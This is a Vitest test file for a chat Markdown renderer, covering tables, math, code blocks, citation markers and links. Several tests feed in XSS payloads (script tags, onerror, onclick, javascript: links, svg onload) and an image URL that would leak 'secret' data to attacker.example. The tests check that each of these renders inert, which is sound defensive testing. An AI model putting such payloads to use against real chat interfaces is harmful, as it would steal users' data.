import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Markdown } from "@/components/chat/Markdown";
import { normalizeMath } from "@/lib/chat/normalize-math";
import { importTranscript } from "@/lib/conversations/import";
import { convert } from "html-to-text";

describe("imported formula rendering", () => {
  it.each(["typed", "html"])(
    "preserves backslashes, pipes, code, and equations in %s tables",
    (format) => {
      const path = String.raw`C:\temp\|name`;
      const rows = [
        ["Path", path],
        ["Math", String.raw`$\alpha$`],
        ["Code", `\`${path}\``],
        ["Bars", String.raw`$|x| + \|y\|$`],
      ];
      const content =
        format === "typed"
          ? importTranscript(
              JSON.stringify({
                messages: [
                  {
                    role: "assistant",
                    content: [
                      { type: "table", columns: ["Kind", "Value"], rows },
                    ],
                  },
                ],
              }),
              "json",
            ).messages[0].content
          : `<table><tr><th>Kind</th><th>Value</th></tr>${rows.map((row) => `<tr>${row.map((value) => `<td>${value}</td>`).join("")}</tr>`).join("")}</table>`;
      const html = renderToStaticMarkup(
        createElement(Markdown, { content, copyCode: false }),
      );
      expect(convert(html, { wordwrap: false }).split(path)).toHaveLength(3);
      expect(html).toContain("<mi>α</mi>");
      expect(html).not.toContain("katex-error");
      expect(html.match(/<td>/g)).toHaveLength(8);
    },
  );
  it("keeps decoded HTML table text inert even when tags and entities are malformed", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content:
          '<table><tr><th>Source</th></tr><tr><td>&lt;script&gt;literal&lt;/script&gt;<<script>alert(1)</script><img src="https://example.com" onerror="alert(1)"></td></tr></table>',
        copyCode: false,
      }),
    );
    expect(html).toContain("&lt;script&gt;literal&lt;/script&gt;");
    expect(html).not.toContain("<script");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("onerror");
  });
  it("renders HTML tables as inert readable tables", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content:
          '<table onclick="alert(1)"><tr><th>Format</th><th>Value</th></tr><tr><td>Road</td><td>1 | 2</td></tr></table>',
        copyCode: false,
      }),
    );
    expect(html).toContain("<table>");
    expect(html).toContain("<th>Format</th>");
    expect(html).toContain("<td>1 | 2</td>");
    expect(html).not.toContain("onclick");
  });
  it("preserves literal HTML table examples inside inline and fenced code", () => {
    const table = "<table><tr><td>Literal</td></tr></table>";
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content: `\`${table}\`\n\n\`\`\`html\n${table}\n\`\`\``,
        highlightCode: false,
        copyCode: false,
      }),
    );
    expect(html).not.toContain("<table>");
    expect(html.split("&lt;table&gt;")).toHaveLength(3);
  });
  it("renders shared ChatGPT layouts as readable text and named source links", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content: `<box padding={3}>
  <grid columns={2}>
    <grid-item>
      <text>Road geometry</text>
      **OpenDRIVE** describes the map. Use <Entity category="software" value="esmini"/> to execute it.
      <Link url="https://example.com/guide_(intro)" title="Reference [guide]"/>
      <Cite refs={["turn123search4"]}/>
    </grid-item>
  </grid>
</box>
<AsyncImage ref="turn123image0"/>
<MemoryCite />`,
      }),
    );
    expect(html).toContain("Road geometry");
    expect(html).toContain("<strong>OpenDRIVE</strong> describes the map.");
    expect(html).toContain("Use esmini to execute it.");
    expect(html).toContain('href="https://example.com/guide_%28intro%29"');
    expect(html).toContain("Reference [guide]</a>");
    expect(html).toContain("Image not included by the share provider");
    expect(html).not.toContain("turn123");
    expect(html).not.toContain("&lt;box");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("<pre>");
  });

  it("preserves literal provider tags and XML inside inline and fenced code", () => {
    const content = [
      '<box><text>Use `<Link url="https://example.com"/>` as an example.</text></box>',
      '```xml\n<road>\n  <Link url="https://example.com"/>\n  <box>literal</box>\n</road>\n```',
      '~~~xml\n<Entity value="literal"/>\n~~~',
      '````text\n```\n<Cite ref="literal"/>\n````',
    ].join("\n\n");
    const html = renderToStaticMarkup(
      createElement(Markdown, { content, highlightCode: false }),
    );
    expect(html).toContain(
      "Use <code>&lt;Link url=&quot;https://example.com&quot;/&gt;</code> as an example.",
    );
    expect(html).toContain(
      "&lt;road&gt;\n  &lt;Link url=&quot;https://example.com&quot;/&gt;\n  &lt;box&gt;literal&lt;/box&gt;\n&lt;/road&gt;",
    );
    expect(html).toContain("&lt;Entity value=&quot;literal&quot;/&gt;");
    expect(html).toContain("&lt;Cite ref=&quot;literal&quot;/&gt;");
  });

  it("keeps unsafe provider components inert without loading media or executing markup", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        renderArtifacts: true,
        content:
          '<box><Link url="javascript:alert(1)" title="Unsafe guide"/><Entity value="&lt;script&gt;"/><AsyncImage url="https://example.com/private"/><svg onload="alert(1)"><text>Hidden SVG</text></svg></box>',
      }),
    );
    expect(html).toContain("Unsafe guide");
    expect(html).toContain('title="SVG diagram"');
    expect(html).toContain('sandbox="allow-scripts"');
    expect(html).not.toContain('href="javascript:');
    expect(html).not.toContain("<script");
    expect(html).not.toContain("<svg");
    expect(html).not.toContain("<img");
    expect(html).toContain("&lt;svg onload=");
  });

  it("hides provider citation control markers from rendered messages", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content:
          "Profile details. \uE200cite\uE202turn883294search6\uE201\n\nNext point.",
      }),
    );
    expect(html).toContain("Profile details.");
    expect(html).toContain("Next point.");
    expect(html).not.toContain("turn883294search6");
    expect(html).not.toContain("cite");
  });

  it("keeps writing content while hiding provider wrappers and citation placeholders", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content: `:::writing{variant="email" id="4728" subject="Final interview format"}
Hi [Name],

Thanks for sharing the schedule.
:::

□memcite□`,
      }),
    );
    expect(html).toContain("Hi [Name]");
    expect(html).toContain("Thanks for sharing the schedule.");
    expect(html).not.toContain("writing");
    expect(html).not.toContain("4728");
    expect(html).not.toContain("memcite");
  });

  it("removes imported LaTeX boxes that render as strokes through text", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content: String.raw`\[
\boxed{\text{Is it realistic?}}\qquad\boxed{\text{Can we deploy it?}}
\]`,
      }),
    );
    expect(html).toContain("Is it realistic?");
    expect(html).toContain("Can we deploy it?");
    expect(html).not.toContain("\\boxed");
  });

  it("makes numbered explanations collapsible without hiding them initially", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content: "1. Check the map.\n2. Check the controls.",
      }),
    );
    expect(html).toContain('<details class="');
    expect(html).toContain('open=""');
    expect(html).toContain("2 numbered points");
    expect(html).toContain("Check the controls.");
  });

  it("makes numbered section headings collapse their following explanation", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content:
          "## 18. Preferred answer\n\nUse the hybrid approach.\n\n## 19. Camera space\n\nProject the map points.",
      }),
    );
    expect(html.match(/<details/g)).toHaveLength(2);
    expect(html).toContain("18. Preferred answer");
    expect(html).toContain("Use the hybrid approach.");
    expect(html).toContain("19. Camera space");
  });

  it("also collapses bold numbered section labels", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content:
          "**31. Off-the-shelf models**\n\nStart with a baseline.\n\n**32. Fine-tuning**\n\nAdapt only after evaluation.",
      }),
    );
    expect(html.match(/<details/g)).toHaveLength(2);
    expect(html).toContain("Start with a baseline.");
    expect(html).toContain("Adapt only after evaluation.");
  });

  it("keeps equations and trailing prose inside lists and quotations", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content: String.raw`- Formula \[x^2\] stays in the list.

> Formula \[y^2\] stays in the quote.`,
      }),
    );
    expect(html).toMatch(
      /<li>[\s\S]*class="katex"[\s\S]*stays in the list\.<\/li>/,
    );
    expect(html).toMatch(
      /<blockquote>[\s\S]*class="katex"[\s\S]*stays in the quote\.[\s\S]*<\/blockquote>/,
    );
  });
  it("renders exported inline and multiline display math as accessible equations", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content: String.raw`Inline \(x^2\).

\[
\frac{a}{b} = c
\]`,
      }),
    );
    expect(html).toContain('class="katex"');
    expect(html).toContain('class="katex-display"');
    expect(html).toContain("<math");
    expect(html).not.toContain("katex-error");
  });

  it("preserves literal delimiters in code, links, existing math and escaped text", () => {
    const content = [
      String.raw`Use \(x^2\).`,
      "`\\(literal\\)`",
      '```python\nvalue = "\\[code\\]"\n```',
      String.raw`[reference](https://example.com/\(path\))`,
      String.raw`$\text{\(literal\)}$`,
      String.raw`Escaped \\(literal\\) and unmatched \(x`,
    ].join("\n\n");
    expect(normalizeMath(content)).toBe(
      content.replace(String.raw`\(x^2\)`, "$x^2$"),
    );
  });
});

describe("chat markdown code blocks", () => {
  it("renders precise paper locators as in-app navigation controls", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content:
          "Section 4.3 (Training Schedule), Eq. (5), Table 2, Figure 3, Algorithm 1, Appendix B.2, Eq. (A.1), Figure S1, and Table S2.",
        decorateRefs: true,
      }),
    );

    expect(html).toContain(
      'data-paper-ref="{&quot;kind&quot;:&quot;section&quot;,&quot;label&quot;:&quot;4.3&quot;}"',
    );
    expect(html).toContain(
      'data-paper-ref="{&quot;kind&quot;:&quot;equation&quot;,&quot;label&quot;:&quot;5&quot;}"',
    );
    expect(html).toContain(
      'data-paper-ref="{&quot;kind&quot;:&quot;table&quot;,&quot;label&quot;:&quot;2&quot;}"',
    );
    expect(html).toContain(
      'data-paper-ref="{&quot;kind&quot;:&quot;figure&quot;,&quot;label&quot;:&quot;3&quot;}"',
    );
    expect(html).toContain(
      'data-paper-ref="{&quot;kind&quot;:&quot;algorithm&quot;,&quot;label&quot;:&quot;1&quot;}"',
    );
    expect(html).toContain(
      'data-paper-ref="{&quot;kind&quot;:&quot;appendix&quot;,&quot;label&quot;:&quot;B.2&quot;}"',
    );
    expect(html).toContain(
      'data-paper-ref="{&quot;kind&quot;:&quot;equation&quot;,&quot;label&quot;:&quot;A.1&quot;}"',
    );
    expect(html).toContain(
      'data-paper-ref="{&quot;kind&quot;:&quot;figure&quot;,&quot;label&quot;:&quot;S1&quot;}"',
    );
    expect(html).toContain(
      'data-paper-ref="{&quot;kind&quot;:&quot;table&quot;,&quot;label&quot;:&quot;S2&quot;}"',
    );
    expect(html).toContain("Section 4.3</button> (Training Schedule)");
    expect(html).not.toContain("href=");
  });

  it("removes links back to the open paper while retaining external links", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content:
          "[MeshSplatting](https://arxiv.org/pdf/2512.06818.pdf) [Repository](https://github.com/org/repo)",
        paperSourceUrl: "https://arxiv.org/abs/2512.06818",
        currentOrigin: "https://papernook.example",
      }),
    );

    expect(html).toContain("<span>MeshSplatting</span>");
    expect(html).not.toContain("arxiv.org");
    expect(html).toContain(
      '<a href="https://github.com/org/repo" target="_blank" rel="noopener noreferrer nofollow">Repository</a>',
    );
  });

  it("highlights fenced source code and labels its language", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content: '```python\ndef project(point):\n    return "pixel"\n```',
      }),
    );

    expect(html).toContain("python");
    expect(html).toContain("language-python");
    expect(html).toContain("hljs-keyword");
    expect(html).toContain("hljs-title");
    expect(html).toContain("hljs-string");
    expect(html).toContain('aria-label="Copy code"');
  });

  it("keeps inline code compact and outside the highlighted frame", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content: "Use `torch.linalg.lstsq` for the solve.",
      }),
    );

    expect(html).toContain("<code>torch.linalg.lstsq</code>");
    expect(html).not.toContain("hljs");
    expect(html).not.toContain('aria-label="Copy code"');
  });

  it("renders precise GitHub code permalinks inline with their claims", () => {
    const permalink =
      "https://github.com/example/research/blob/0123456789abcdef0123456789abcdef01234567/src/train.py#L10-L24";
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content: `The optimizer is initialized in [src/train.py#L10-L24](${permalink}).`,
        currentOrigin: "https://papernook.example",
      }),
    );

    expect(html).toContain(
      `The optimizer is initialized in <a href="${permalink}" target="_blank" rel="noopener noreferrer nofollow">src/train.py#L10-L24</a>.`,
    );
  });

  it("renders an exact source excerpt after its permalink as inert code", () => {
    const permalink =
      "https://github.com/example/research/blob/0123456789abcdef0123456789abcdef01234567/src/train.py#L10-L12";
    const source = [
      "def render(value: str) -> str:",
      '    literal = "<script>alert(1)</script>"',
      "    return literal + value",
    ].join("\n");
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content: `The renderer preserves the input [src/train.py#L10-L12](${permalink}).\n\n\`\`\`python\n${source}\n\`\`\``,
        currentOrigin: "https://papernook.example",
        highlightCode: false,
      }),
    );

    const linkPosition = html.indexOf("src/train.py#L10-L12</a>");
    const sourcePosition = html.indexOf("def render(value: str) -&gt; str:");
    expect(linkPosition).toBeGreaterThan(-1);
    expect(sourcePosition).toBeGreaterThan(linkPosition);
    expect(html).toContain(
      `<a href="${permalink}" target="_blank" rel="noopener noreferrer nofollow">src/train.py#L10-L12</a>`,
    );
    expect(html).toContain(
      "literal = &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;",
    );
    expect(html).not.toContain("<script>");
  });

  it("keeps internal Markdown links in place", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content:
          "[Paper](/paper/ml/attention) [Section](#details) [Absolute](https://papernook.example/paper/ml/attention)",
        currentOrigin: "https://papernook.example",
      }),
    );

    expect(html.match(/target=/g)).toBeNull();
    expect(html.match(/rel=/g)).toBeNull();
  });

  it("can defer syntax highlighting while a response is streaming", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content: "```\nconst answer = 42;\n```",
        highlightCode: false,
        copyCode: false,
      }),
    );

    expect(html).toContain("const answer = 42;");
    expect(html).not.toContain("hljs");
    expect(html).not.toContain('aria-label="Copy code"');
  });

  it("never auto-loads an image the answer points at", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content:
          "![leak](https://attacker.example/collect?data=secret)\n\n![](https://attacker.example/pixel.png)",
      }),
    );

    expect(html).not.toContain("<img");
    expect(html).toContain("https://attacker.example/collect?data=secret");
    expect(html).toContain("leak");
  });
});
